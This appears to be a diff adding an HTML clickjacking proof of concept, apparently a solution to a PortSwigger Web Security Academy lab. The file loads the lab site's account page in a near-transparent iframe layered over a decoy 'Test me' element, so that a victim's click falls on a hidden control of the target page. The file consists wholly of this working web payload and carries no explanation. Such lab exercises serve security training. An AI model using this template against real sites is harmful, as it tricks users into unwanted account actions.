@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <style>
+    iframe {
+        position:relative;
+        width:500;
+        height: 700;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:300;
+        left:60;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="https://0a170053040d8c6ec08702f6005a004a.web-security-academy.net/my-account"></iframe>
+</body>
+</html>
